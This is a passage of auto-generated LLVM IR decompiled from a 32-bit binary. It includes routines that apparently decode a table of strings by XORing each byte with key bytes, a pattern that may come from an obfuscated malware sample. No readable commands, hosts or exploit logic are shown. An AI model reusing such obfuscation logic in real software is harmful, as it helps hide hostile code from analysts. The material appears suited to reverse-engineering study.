  store i32 %v3_8051bcb, i32* %v3_8051bcf, align 4
  %v0_8051bd0 = call i32 @function_8053304()
  store i32 %v0_8051bd0, i32* %eax.global-to-local, align 4
  %v0_8051bd5 = load i32, i32* @esp, align 4
  %v1_8051bd5 = add i32 %v0_8051bd5, -4
  %v2_8051bd5 = inttoptr i32 %v1_8051bd5 to i32*
  store i32 16384, i32* %v2_8051bd5, align 4
  %v1_8051bda = add i32 %v0_8051bd5, -8
  %v2_8051bda = inttoptr i32 %v1_8051bda to i32*
  store i32 1, i32* %v2_8051bda, align 4
  %v1_8051bdc = add i32 %v0_8051bd5, 52
  %v2_8051bdc = inttoptr i32 %v1_8051bdc to i32*
  %v3_8051bdc = load i32, i32* %v2_8051bdc, align 4
  %v1_8051be0 = add i32 %v3_8051bdc, 13
  store i32 %v1_8051be0, i32* %eax.global-to-local, align 4
  %v2_8051be3 = add i32 %v0_8051bd5, -12
  %v3_8051be3 = inttoptr i32 %v2_8051be3 to i32*
  store i32 %v1_8051be0, i32* %v3_8051be3, align 4
  %v1_8051be4 = add i32 %v0_8051bd5, 48
  %v2_8051be4 = inttoptr i32 %v1_8051be4 to i32*
  %v3_8051be4 = load i32, i32* %v2_8051be4, align 4
  store i32 %v3_8051be4, i32* %eax.global-to-local, align 4
  %v2_8051be8 = add i32 %v0_8051bd5, -16
  %v3_8051be8 = inttoptr i32 %v2_8051be8 to i32*
  store i32 %v3_8051be4, i32* %v3_8051be8, align 4
  %v0_8051be9 = call i32 @function_8053304()
  %v0_8051bee = load i32, i32* @esp, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_8051bf3 = add i32 %v0_8051bee, 28
  %v2_8051bf3 = inttoptr i32 %v1_8051bf3 to i32*
  store i32 16384, i32* %v2_8051bf3, align 4
  %v1_8051bf8 = add i32 %v0_8051bee, 68
  %v2_8051bf8 = inttoptr i32 %v1_8051bf8 to i32*
  %v3_8051bf8 = load i32, i32* %v2_8051bf8, align 4
  store i32 %v3_8051bf8, i32* %ecx.global-to-local, align 4
  %v1_8051bfc = add i32 %v3_8051bf8, 13
  %v2_8051bfc = inttoptr i32 %v1_8051bfc to i8*
  %v3_8051bfc = load i8, i8* %v2_8051bfc, align 1
  %v4_8051bfc = zext i8 %v3_8051bfc to i32
  %v5_8051bfc = load i32, i32* %eax.global-to-local, align 4
  %v6_8051bfc = and i32 %v5_8051bfc, -256
  %v7_8051bfc = or i32 %v6_8051bfc, %v4_8051bfc
  store i32 %v7_8051bfc, i32* %eax.global-to-local, align 4
  %v2_8051bff = add i32 %v0_8051bee, 24
  %v3_8051bff = inttoptr i32 %v2_8051bff to i32*
  store i32 %v7_8051bfc, i32* %v3_8051bff, align 4
  %v0_8051c00 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8051c00 = add i32 %v0_8051c00, 4
  %v2_8051c00 = inttoptr i32 %v1_8051c00 to i32*
  %v3_8051c00 = load i32, i32* %v2_8051c00, align 4
  store i32 %v3_8051c00, i32* %eax.global-to-local, align 4
  %v2_8051c03 = add i32 %v0_8051bee, 20
  %v3_8051c03 = inttoptr i32 %v2_8051c03 to i32*
  store i32 %v3_8051c00, i32* %v3_8051c03, align 4
  %v1_8051c04 = add i32 %v0_8051bee, 64
  %v2_8051c04 = inttoptr i32 %v1_8051c04 to i32*
  %v3_8051c04 = load i32, i32* %v2_8051c04, align 4
  store i32 %v3_8051c04, i32* %eax.global-to-local, align 4
  %v2_8051c08 = add i32 %v0_8051bee, 16
  %v3_8051c08 = inttoptr i32 %v2_8051c08 to i32*
  store i32 %v3_8051c04, i32* %v3_8051c08, align 4
  %v0_8051c09 = call i32 @function_8053304()
  store i32 %v0_8051c09, i32* %eax.global-to-local, align 4
  %v0_8051c0e = load i32, i32* @esp, align 4
  br label %dec_label_pc_8051b31

; uselistorder directives
  uselistorder i64 %v8_8051acf, { 1, 0 }
  uselistorder i32 %v1_8051ac2, { 1, 0 }
  uselistorder i32* %v2_8050cbe, { 1, 0 }
  uselistorder i32 %v2_805198b, { 1, 0 }
  uselistorder i32 %v3_8051988, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8051924, { 0, 2, 3, 1 }
  uselistorder i32 %v1_8051923, { 1, 0, 2 }
  uselistorder i16 %v1_805192f, { 1, 0 }
  uselistorder i64 %v8_8051910, { 1, 0 }
  uselistorder i32 %v3_80518a3, { 1, 0 }
  uselistorder i32 %v0_80518a3, { 1, 0 }
  uselistorder i32 %v0_805189b, { 1, 0 }
  uselistorder i32 %v1_80517a8, { 1, 2, 0 }
  uselistorder i32 %v1_805172f, { 1, 2, 0 }
  uselistorder i32 %v1_80516b6, { 1, 2, 0 }
  uselistorder i32 %v1_805163d, { 1, 2, 0 }
  uselistorder i32 %v0_80515f7, { 1, 0 }
  uselistorder i32 %v0_80515a6, { 1, 0 }
  uselistorder i32 %v0_8051a27, { 1, 0 }
  uselistorder i32 %v7_80514f8, { 1, 0 }
  uselistorder i32 %v0_80514f8, { 1, 2, 0 }
  uselistorder i32 %v6_80514eb, { 1, 0 }
  uselistorder i32 %v0_80514eb, { 0, 2, 1 }
  uselistorder i32 %v6_80514de, { 1, 0 }
  uselistorder i32 %v2_80514ca, { 1, 0, 2 }
  uselistorder i32 %v1_80514c7, { 1, 0, 2 }
  uselistorder i32 %v0_80514c4, { 1, 0 }
  uselistorder i32 %v0_80514c0, { 0, 1, 4, 3, 2, 5 }
  uselistorder i32 %v2_805103d, { 1, 0 }
  uselistorder i32 %v0_805103d, { 1, 2, 4, 3, 0 }
  uselistorder i32 %v1_805103d, { 0, 2, 1 }
  uselistorder i32 %v0_80510bb128, { 1, 0 }
  uselistorder i32 %v1_8051440, { 2, 1, 0 }
  uselistorder i32 %v9_805140f, { 1, 0 }
  uselistorder i32 %v0_80516b6, { 0, 1, 3, 2 }
  uselistorder i32 %v9_805137c, { 1, 0 }
  uselistorder i32 %v1_8051375, { 0, 1, 4, 3, 2 }
  uselistorder i32 %v0_8051375, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v3_805134c, { 2, 1, 0, 3 }
  uselistorder i32 %v2_8051326, { 1, 2, 0 }
  uselistorder i32 %v1_8051326, { 1, 2, 0, 3 }
  uselistorder i32 %v3_8051321, { 3, 2, 0, 1, 4, 5, 6 }
  uselistorder i32 %v0_80512f7, { 1, 0, 2 }
  uselistorder i32 %v0_80512cb, { 0, 2, 1 }
  uselistorder i32 %v0_80512a4, { 4, 3, 2, 1, 0, 5 }
  uselistorder i32* %v1_805182b, { 0, 2, 1 }
  uselistorder i32 %v0_805125b, { 4, 3, 2, 1, 0, 5 }
  uselistorder i32 %v1_8051232, { 2, 1, 0 }
  uselistorder i32 %v9_8051201, { 1, 0 }
  uselistorder i32 %v0_805163d, { 0, 1, 3, 2 }
  uselistorder i32 %v1_80511ed, { 2, 1, 0 }
  uselistorder i32 %v9_80511bc, { 1, 0 }
  uselistorder i32 %v0_805172f, { 0, 1, 3, 2 }
  uselistorder i32 %v0_8051192, { 1, 0, 2, 3 }
  uselistorder i32 %v1_8051182, { 2, 1, 0 }
  uselistorder i32 %v9_805115a, { 1, 0 }
  uselistorder i32 %v0_80515eb, { 0, 1, 3, 2 }
  uselistorder i32 %v0_8051135, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8051117, { 4, 0, 1, 2, 3 }
  uselistorder i32 %v0_8051112, { 1, 0, 2, 3 }
  uselistorder i32 %v1_8051102, { 2, 1, 0 }
  uselistorder i32 %v9_80510d1, { 1, 0 }
  uselistorder i32 %v0_805159a, { 0, 1, 3, 2 }
  uselistorder i32 %v2_80510af, { 1, 0 }
  uselistorder i32 %v0_80510af, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v3_80510a9, { 0, 1, 3, 2 }
  uselistorder i32 %v0_80510a9, { 0, 2, 1 }
  uselistorder i32 %v0_80510a4, { 1, 0 }
  uselistorder i32 %v0_805107f, { 1, 0, 2 }
  uselistorder i32 %v1_8051066, { 1, 0, 2 }
  uselistorder i32 %v1_805104a, { 1, 0, 2 }
  uselistorder i32 %v0_8051460, { 1, 0, 2 }
  uselistorder i32 %v0_805144b, { 3, 0, 1, 2 }
  uselistorder i32 %v0_80510bb129, { 3, 0, 1, 2 }
  uselistorder i32 %v2_805103d18, { 1, 0 }
  uselistorder i32 %v3_8051024, { 1, 0 }
  uselistorder i32 %v0_8051024, { 7, 21, 8, 19, 9, 18, 10, 20, 11, 16, 12, 15, 0, 14, 22, 17, 13, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 %v1_805100f, { 0, 2, 1 }
  uselistorder i32 %v0_805100b, { 1, 0 }
  uselistorder i32 %v0_8050ff2, { 1, 4, 0, 2, 3, 5 }
  uselistorder i32 %v1_8050fe8, { 1, 0 }
  uselistorder i32 %v1_8050faf, { 2, 1, 0 }
  uselistorder i32 %v9_8050f7e, { 1, 0 }
  uselistorder i32 %v0_80517a8, { 0, 1, 3, 2 }
  uselistorder i32 %v1_8050f6a, { 1, 0 }
  uselistorder i32 %v0_8050f6a, { 0, 2, 3, 1 }
  uselistorder i32 %v1_8050f49, { 1, 0 }
  uselistorder i32 %v2_8050f46, { 1, 0 }
  uselistorder i32 %v0_8050f44, { 1, 0 }
  uselistorder i32 %v0_8050f31, { 2, 1, 0 }
  uselistorder i32 %v1_8050f2e, { 1, 0 }
  uselistorder i32 %v2_8050f2b, { 1, 0 }
  uselistorder i32 %v3_8050f1f, { 3, 1, 0, 2, 4 }
  uselistorder i32 %v2_8050eca, { 1, 0 }
  uselistorder i32 %v1_8050eaa, { 1, 0 }
  uselistorder i32 %v0_8050eaa, { 0, 2, 3, 1 }
  uselistorder i32 %v2_8050e95, { 1, 0 }
  uselistorder i32 %v3_8050e92, { 1, 0, 2, 3 }
  uselistorder i32 %v2_805197d, { 1, 0 }
  uselistorder i32 %v1_805197a, { 2, 1, 0 }
  uselistorder i32 %v3_8050e5a, { 1, 0, 2 }
  uselistorder i32 %v2_8050e58, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_8050dfd, { 1, 0 }
  uselistorder i32 %v1_8050df2, { 1, 0 }
  uselistorder i32 %v0_8050df2, { 1, 0 }
  uselistorder i32 %v0_8050dfb, { 0, 3, 2, 1 }
  uselistorder i32 %v1_8050dcf, { 1, 0 }
  uselistorder i32 %v0_8050dcf, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v6_8050dc1, { 1, 0, 2 }
  uselistorder i32 %v4_8050d84, { 1, 2, 0 }
  uselistorder i32 %v3_8050d53, { 1, 0, 2 }
  uselistorder i32 %v0_8050cd7, { 0, 2, 1 }
  uselistorder i32 %v0_8050cce, { 0, 3, 2, 1 }
  uselistorder i32 %v0_8050a9565, { 1, 0 }
  uselistorder i32 %v0_8050cb1, { 2, 1, 0 }
  uselistorder i8 %v1_8050c83, { 1, 0 }
  uselistorder i8 %v2_8050c5d, { 0, 4, 5, 6, 7, 8, 10, 9, 3, 2, 1 }
  uselistorder i32 %v2_8050c54, { 4, 8, 6, 1, 0, 2, 3, 5, 7 }
  uselistorder i32 %v5_8050c52, { 3, 2, 5, 4, 1, 0 }
  uselistorder i32 %v1_8050c4c, { 3, 0, 1, 2 }
  uselistorder i32 %v1_8050c47, { 2, 1, 0, 3 }
  uselistorder i32 %v1_8050bfb, { 1, 0 }
  uselistorder i32 %v0_8050b4b, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v0_8050b46, { 1, 0 }
  uselistorder i32 %v1_8050b23, { 0, 2, 1 }
  uselistorder i32 %v0_8050a83, { 2, 0, 1 }
  uselistorder i32 %v0_8050a47, { 1, 0, 2 }
  uselistorder i32* %edx.global-to-local, { 5, 6, 7, 8, 9, 10, 34, 36, 29, 37, 19, 0, 17, 21, 22, 23, 25, 26, 27, 38, 39, 40, 30, 1, 2, 3, 4, 11, 12, 13, 14, 15, 16, 18, 20, 24, 28, 31, 32, 33, 41, 42, 55, 54, 43, 35, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53 }
  uselistorder i32* %ecx.global-to-local, { 2, 3, 4, 5, 17, 18, 19, 20, 21, 22, 14, 23, 24, 8, 0, 7, 9, 15, 1, 25, 6, 10, 11, 12, 13, 16, 26, 39, 40, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38 }
  uselistorder i32* %eax.global-to-local, { 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 44, 42, 43, 45, 46, 47, 48, 49, 50, 51, 52, 53, 55, 127, 56, 138, 139, 57, 140, 141, 142, 143, 144, 146, 147, 148, 149, 150, 151, 152, 153, 154, 121, 122, 123, 58, 59, 60, 61, 62, 63, 155, 156, 157, 158, 159, 160, 89, 90, 91, 92, 93, 94, 95, 0, 1, 2, 3, 4, 5, 80, 81, 82, 83, 84, 85, 86, 98, 99, 100, 101, 102, 106, 107, 108, 109, 110, 111, 112, 113, 166, 167, 168, 169, 181, 133, 170, 171, 172, 173, 124, 134, 125, 126, 128, 129, 130, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 161, 162, 163, 164, 165, 65, 68, 66, 67, 69, 70, 71, 72, 73, 64, 74, 75, 76, 77, 78, 79, 87, 88, 96, 97, 103, 104, 105, 114, 115, 116, 117, 118, 119, 120, 131, 132, 135, 136, 137, 174, 175, 176, 177, 178, 179, 180, 182, 230, 231, 232, 228, 229, 233, 223, 224, 225, 226, 227, 183, 184, 185, 186, 187, 188, 189, 190, 191, 145, 192, 197, 193, 194, 195, 196, 198, 199, 200, 201, 202, 203, 204, 205, 54, 220, 222, 221, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219 }
  uselistorder i32 (i32)* @function_804fcd0, { 1, 0 }
  uselistorder i32 ()* @function_8053230, { 1, 0 }
  uselistorder i32 1864, { 1, 2, 0, 3 }
  uselistorder i8 31, { 0, 2, 3, 1 }
  uselistorder i32 1888, { 4, 0, 1, 2, 3 }
  uselistorder i8* bitcast (i32* @0 to i8*), { 1, 0, 2 }
  uselistorder i32 ()* @function_8052bef, { 1, 0 }
  uselistorder i32 1872, { 0, 2, 1 }
  uselistorder i32 (i8)* @function_8051c50, { 2, 3, 8, 7, 0, 6, 1, 5, 4, 9, 10, 32, 33, 34, 35, 36, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 37, 38, 39, 40 }
  uselistorder i32 (i32, i32*)* @function_8051c20, { 2, 3, 8, 7, 0, 6, 1, 4, 5, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 48, 37, 38, 39, 40, 41, 54, 55, 56, 57, 42, 43, 44, 45, 46, 47, 49, 50, 51, 52, 53 }
  uselistorder i32 1880, { 0, 1, 2, 3, 4, 5, 10, 8, 6, 9, 7 }
  uselistorder i32 (i8)* @function_8051cd0, { 2, 3, 8, 7, 0, 6, 1, 4, 5, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43 }
  uselistorder i8 ptrtoint (i32* @0 to i8), { 11, 12, 13, 14, 0, 1, 6, 7, 8, 9, 2, 3, 4, 5, 15, 16, 10, 17 }
  uselistorder i32 ()* @function_80526d0, { 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 4, 3, 2, 13, 12, 11, 10, 9, 8, 1, 0, 7, 6, 5 }
  uselistorder i32 ()* @function_8053304, { 21, 20, 19, 18, 17, 16, 15, 6, 5, 3, 2, 12, 11, 25, 24, 14, 13, 10, 9, 8, 7, 23, 22, 4, 1, 0 }
  uselistorder i8 -5, { 0, 3, 1, 2 }
  uselistorder i8 -3, { 6, 7, 8, 2, 0, 1, 3, 4, 5 }
  uselistorder i8 65, { 1, 0 }
  uselistorder i32 ()* @function_805328e, { 4, 3, 2, 1, 0 }
  uselistorder i8 37, { 5, 3, 2, 4, 0, 1, 6 }
  uselistorder i8 35, { 6, 4, 3, 5, 1, 0, 2 }
  uselistorder i8 36, { 6, 4, 3, 5, 1, 0, 2, 7 }
  uselistorder i8 62, { 7, 4, 5, 3, 6, 1, 0, 2 }
  uselistorder i8 58, { 7, 4, 5, 3, 6, 1, 0, 2, 8, 9 }
  uselistorder i32 (i32*)* @function_8052e82, { 1, 2, 3, 4, 0, 5, 6 }
  uselistorder i32 ()* @function_8052dc8, { 2, 1, 0 }
  uselistorder i32 1572, { 1, 2, 0 }
  uselistorder i32 1700, { 2, 0, 1 }
  uselistorder i32 ()* @function_80501d0, { 2, 3, 1, 0 }
  uselistorder i32 288, { 0, 1, 3, 4, 2 }
  uselistorder i8 6, { 0, 3, 4, 5, 6, 2, 7, 1 }
  uselistorder i32 ()* @function_80532c1, { 1, 0 }
  uselistorder i32 -28, { 3, 2, 4, 5, 6, 0, 1 }
  uselistorder i32 -24, { 1, 0, 2, 3, 4 }
  uselistorder i32 -20, { 2, 1, 3, 4, 0, 5 }
  uselistorder i8 -1, { 3, 4, 5, 0, 1, 2 }
  uselistorder i32 -15, { 1, 0 }
  uselistorder i32 (i32)* @function_804fa40, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 1844, { 1, 0, 2 }
  uselistorder i16* @global_var_80572d6.38, { 1, 0 }
  uselistorder i8 -58, { 1, 0 }
  uselistorder i8 -87, { 1, 0 }
  uselistorder i8 100, { 1, 0 }
  uselistorder i32 1868, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8051b47, { 1, 0 }
  uselistorder label %dec_label_pc_805193b, { 1, 0 }
  uselistorder label %dec_label_pc_8051528, { 1, 0 }
  uselistorder label %dec_label_pc_8051453, { 8, 4, 0, 3, 5, 6, 1, 2, 7 }
  uselistorder label %dec_label_pc_805103d.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_805140f, { 1, 0 }
  uselistorder label %dec_label_pc_8051396, { 1, 0 }
  uselistorder label %dec_label_pc_8051366, { 1, 0 }
  uselistorder label %dec_label_pc_805132c, { 1, 0 }
  uselistorder label %dec_label_pc_8051321, { 3, 4, 10, 6, 1, 5, 7, 8, 0, 2, 11, 9 }
  uselistorder label %dec_label_pc_8051201, { 1, 0 }
  uselistorder label %dec_label_pc_80511bc, { 1, 0 }
  uselistorder label %dec_label_pc_8051185, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805115a, { 1, 0 }
  uselistorder label %dec_label_pc_8051105, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80510d1, { 1, 0 }
  uselistorder label %dec_label_pc_80510b3, { 5, 0, 3, 1, 2, 4 }
  uselistorder label %dec_label_pc_8051092, { 1, 2, 0 }
  uselistorder label %dec_label_pc_805107f, { 1, 0 }
  uselistorder label %dec_label_pc_805106d, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8051041, { 1, 0 }
  uselistorder label %dec_label_pc_8051041.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_8051014, { 1, 0 }
  uselistorder label %dec_label_pc_805100f, { 1, 0 }
  uselistorder label %dec_label_pc_8050fcd, { 1, 0 }
  uselistorder label %dec_label_pc_8050fb9, { 1, 0 }
  uselistorder label %dec_label_pc_8050fb2.loopexit12.loopexit, { 13, 11, 4, 9, 0, 5, 6, 7, 8, 10, 12, 1, 2, 3, 14 }
  uselistorder label %dec_label_pc_8050fb2.backedge, { 2, 4, 5, 3, 0, 1, 6 }
  uselistorder label %dec_label_pc_8050f7e, { 1, 0 }
  uselistorder label %dec_label_pc_8050f5b, { 5, 6, 7, 2, 0, 1, 3, 4 }
  uselistorder label %dec_label_pc_8050f44, { 1, 0 }
  uselistorder label %dec_label_pc_8050eec, { 1, 0 }
  uselistorder label %dec_label_pc_8050e9b, { 0, 3, 4, 5, 1, 6, 2 }
  uselistorder label %dec_label_pc_8050e66, { 1, 0 }
  uselistorder label %dec_label_pc_8050e20, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8050df2, { 1, 0 }
  uselistorder label %dec_label_pc_8050d0b, { 10, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11 }
  uselistorder label %dec_label_pc_8050d00, { 1, 0 }
  uselistorder label %dec_label_pc_8050cc5, { 1, 0 }
  uselistorder label %dec_label_pc_8050c91, { 1, 0 }
  uselistorder label %dec_label_pc_8050c47.preheader, { 16, 14, 13, 0, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 15 }
  uselistorder label %dec_label_pc_8050a95, { 1, 2, 4, 0, 3 }
}

define i32 @function_8051c20(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_8051c20:
  %tmp2 = ptrtoint i32* %arg2 to i32
  store i32 %tmp2, i32* @ecx, align 4
  %v1_8051c28 = icmp eq i32* %arg2, null
  %v1_8051c2a = mul i32 %arg1, 8
  store i32 %v1_8051c2a, i32* @edx, align 4
  br i1 %v1_8051c28, label %dec_label_pc_8051c43, label %dec_label_pc_8051c39

dec_label_pc_8051c39:                             ; preds = %dec_label_pc_8051c20
  %v1_8051c39 = add i32 %v1_8051c2a, add (i32 ptrtoint (i32* @global_var_8057360.52 to i32), i32 4)
  %v2_8051c39 = inttoptr i32 %v1_8051c39 to i32*
  %v3_8051c39 = load i32, i32* %v2_8051c39, align 4
  %v1_8051c3c = urem i32 %v3_8051c39, 65536
  store i32 %v1_8051c3c, i32* %arg2, align 4
  %v0_8051c43.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8051c43

dec_label_pc_8051c43:                             ; preds = %dec_label_pc_8051c20, %dec_label_pc_8051c39
  %v0_8051c43 = phi i32 [ %v1_8051c2a, %dec_label_pc_8051c20 ], [ %v0_8051c43.pre, %dec_label_pc_8051c39 ]
  %v1_8051c43 = add i32 %v0_8051c43, ptrtoint (i32* @global_var_8057360.52 to i32)
  %v2_8051c43 = inttoptr i32 %v1_8051c43 to i32*
  %v3_8051c43 = load i32, i32* %v2_8051c43, align 4
  ret i32 %v3_8051c43

; uselistorder directives
  uselistorder label %dec_label_pc_8051c43, { 1, 0 }
}

define i32 @function_8051c50(i8 %arg1) local_unnamed_addr {
dec_label_pc_8051c50:
  %ebp.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-44 = alloca i8, align 1
  %v4_8051c59 = zext i8 %arg1 to i32
  %v1_8051c5d = mul nuw nsw i32 %v4_8051c59, 8
  %v2_8051c5d = add i32 %v1_8051c5d, ptrtoint (i32* @global_var_8057360.52 to i32)
  store i32 %v2_8051c5d, i32* @ecx, align 4
  %v0_8051c64 = load i16, i16* @global_var_80571dc.53, align 2
  %v1_8051c64 = sext i16 %v0_8051c64 to i32
  %v1_8051c69 = add i32 %v1_8051c5d, add (i32 ptrtoint (i32* @global_var_8057360.52 to i32), i32 4)
  %v2_8051c69 = inttoptr i32 %v1_8051c69 to i16*
  %v3_8051c69 = load i16, i16* %v2_8051c69, align 4
  %v4_8051c69 = icmp eq i16 %v3_8051c69, 0
  br i1 %v4_8051c69, label %dec_label_pc_8051cba, label %dec_label_pc_8051c70

dec_label_pc_8051c70:                             ; preds = %dec_label_pc_8051c50
  store i32 %v1_8051c64, i32* %ebp.global-to-local, align 4
  store i32 0, i32* @edx, align 4
  %v2_8051c78 = udiv i32 %v1_8051c64, 16777216
  %v2_8051c7b = udiv i32 %v1_8051c64, 256
  store i32 %v2_8051c7b, i32* %edi.global-to-local, align 4
  %v5_8051c7e = trunc i32 %v2_8051c78 to i8
  store i8 %v5_8051c7e, i8* %stack_var_-44, align 1
  %v2_8051c81 = udiv i32 %v1_8051c64, 65536
  store i32 %v2_8051c81, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8051c84

dec_label_pc_8051c84:                             ; preds = %dec_label_pc_8051c84.dec_label_pc_8051c84_crit_edge, %dec_label_pc_8051c70
  %v0_8051c8a = phi i32 [ %v0_8051c8a.pre, %dec_label_pc_8051c84.dec_label_pc_8051c84_crit_edge ], [ %v1_8051c64, %dec_label_pc_8051c70 ]
  %v0_8051c86 = phi i32 [ %v1_8051cb6, %dec_label_pc_8051c84.dec_label_pc_8051c84_crit_edge ], [ 0, %dec_label_pc_8051c70 ]
  %v0_8051c84 = phi i32 [ %v0_8051cae, %dec_label_pc_8051c84.dec_label_pc_8051c84_crit_edge ], [ %v2_8051c5d, %dec_label_pc_8051c70 ]
  %v1_8051c84 = inttoptr i32 %v0_8051c84 to i32*
  %v2_8051c84 = load i32, i32* %v1_8051c84, align 4
  %v2_8051c88 = add i32 %v2_8051c84, %v0_8051c86
  %v1_8051c8c = inttoptr i32 %v2_8051c88 to i8*
  %v2_8051c8c = load i8, i8* %v1_8051c8c, align 1
  %v4_8051c8c = trunc i32 %v0_8051c8a to i8
  %v5_8051c8c = xor i8 %v2_8051c8c, %v4_8051c8c
  store i8 %v5_8051c8c, i8* %v1_8051c8c, align 1
  %v0_8051c8e = load i32, i32* @edx, align 4
  %v0_8051c90 = load i32, i32* @ecx, align 4
  %v1_8051c90 = inttoptr i32 %v0_8051c90 to i32*
  %v2_8051c90 = load i32, i32* %v1_8051c90, align 4
  %v2_8051c92 = add i32 %v2_8051c90, %v0_8051c8e
  %v0_8051c94 = load i32, i32* %edi.global-to-local, align 4
  %v1_8051c96 = inttoptr i32 %v2_8051c92 to i8*
  %v2_8051c96 = load i8, i8* %v1_8051c96, align 1
  %v4_8051c96 = trunc i32 %v0_8051c94 to i8
  %v5_8051c96 = xor i8 %v2_8051c96, %v4_8051c96
  store i8 %v5_8051c96, i8* %v1_8051c96, align 1
  %v0_8051c98 = load i32, i32* @edx, align 4
  %v0_8051c9a = load i32, i32* @ecx, align 4
  %v1_8051c9a = inttoptr i32 %v0_8051c9a to i32*
  %v2_8051c9a = load i32, i32* %v1_8051c9a, align 4
  %v2_8051c9c = add i32 %v2_8051c9a, %v0_8051c98
  %v0_8051c9e = load i32, i32* %esi.global-to-local, align 4
  %v1_8051ca0 = inttoptr i32 %v2_8051c9c to i8*
  %v2_8051ca0 = load i8, i8* %v1_8051ca0, align 1
  %v4_8051ca0 = trunc i32 %v0_8051c9e to i8
  %v5_8051ca0 = xor i8 %v2_8051ca0, %v4_8051ca0
  store i8 %v5_8051ca0, i8* %v1_8051ca0, align 1
  %v0_8051ca2 = load i32, i32* @edx, align 4
  %v0_8051ca4 = load i32, i32* @ecx, align 4
  %v1_8051ca4 = inttoptr i32 %v0_8051ca4 to i32*
  %v2_8051ca4 = load i32, i32* %v1_8051ca4, align 4
  %v1_8051ca6 = add i32 %v0_8051ca2, 1
  store i32 %v1_8051ca6, i32* @edx, align 4
  %v2_8051ca7 = add i32 %v2_8051ca4, %v0_8051ca2
  %v2_8051ca9 = load i8, i8* %stack_var_-44, align 1
  %v1_8051cac = inttoptr i32 %v2_8051ca7 to i8*
  %v2_8051cac = load i8, i8* %v1_8051cac, align 1
  %v5_8051cac = xor i8 %v2_8051cac, %v2_8051ca9
  store i8 %v5_8051cac, i8* %v1_8051cac, align 1
  %v0_8051cae = load i32, i32* @ecx, align 4
  %v1_8051cae = add i32 %v0_8051cae, 4
  %v2_8051cae = inttoptr i32 %v1_8051cae to i32*
  %v3_8051cae = load i32, i32* %v2_8051cae, align 4
  %v1_8051cb1 = urem i32 %v3_8051cae, 65536
  %v1_8051cb6 = load i32, i32* @edx, align 4
  %v8_8051cb8 = icmp sgt i32 %v1_8051cb1, %v1_8051cb6
  br i1 %v8_8051cb8, label %dec_label_pc_8051c84.dec_label_pc_8051c84_crit_edge, label %dec_label_pc_8051cba.loopexit

dec_label_pc_8051c84.dec_label_pc_8051c84_crit_edge: ; preds = %dec_label_pc_8051c84
  %v0_8051c8a.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8051c84

dec_label_pc_8051cba.loopexit:                    ; preds = %dec_label_pc_8051c84
  br label %dec_label_pc_8051cba

dec_label_pc_8051cba:                             ; preds = %dec_label_pc_8051cba.loopexit, %dec_label_pc_8051c50
  %v0_8051cc1 = phi i32 [ %v1_8051cb1, %dec_label_pc_8051cba.loopexit ], [ %v1_8051c64, %dec_label_pc_8051c50 ]
  ret i32 %v0_8051cc1

; uselistorder directives
  uselistorder i32 %v1_8051cb6, { 1, 0 }
  uselistorder i32 %v1_8051cb1, { 1, 0 }
  uselistorder i32 %v0_8051cae, { 1, 0 }
  uselistorder i32 %v1_8051c64, { 3, 4, 0, 1, 2, 5 }
  uselistorder i8* %stack_var_-44, { 1, 0 }
}

define i32 @function_8051cd0(i8 %arg1) local_unnamed_addr {
dec_label_pc_8051cd0:
  %ebp.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-44 = alloca i8, align 1
  %v4_8051cd9 = zext i8 %arg1 to i32
  %v1_8051cdd = mul nuw nsw i32 %v4_8051cd9, 8
  %v2_8051cdd = add i32 %v1_8051cdd, ptrtoint (i32* @global_var_8057360.52 to i32)
  store i32 %v2_8051cdd, i32* %ecx.global-to-local, align 4
  %v0_8051ce4 = load i16, i16* @global_var_80571dc.53, align 2
  %v1_8051ce4 = sext i16 %v0_8051ce4 to i32
  %v1_8051ce9 = add i32 %v1_8051cdd, add (i32 ptrtoint (i32* @global_var_8057360.52 to i32), i32 4)
  %v2_8051ce9 = inttoptr i32 %v1_8051ce9 to i16*
  %v3_8051ce9 = load i16, i16* %v2_8051ce9, align 4
